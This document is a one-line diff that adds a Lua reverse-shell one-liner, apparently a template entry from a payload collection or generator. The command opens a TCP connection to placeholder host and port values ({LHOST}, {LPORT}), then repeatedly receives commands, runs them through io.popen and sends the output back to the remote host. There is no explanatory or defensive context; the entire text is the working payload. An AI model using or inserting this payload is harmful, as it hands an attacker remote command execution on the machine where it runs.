@@ -1,0 +1,1 @@
+lua -e "local s=require('socket');local t=s.tcp();t:connect('{LHOST}',{LPORT});while true do local r,_=t:receive();if r then local f=io.popen(r,'r');local o=f:read('*a');f:close();t:send(o) end end"
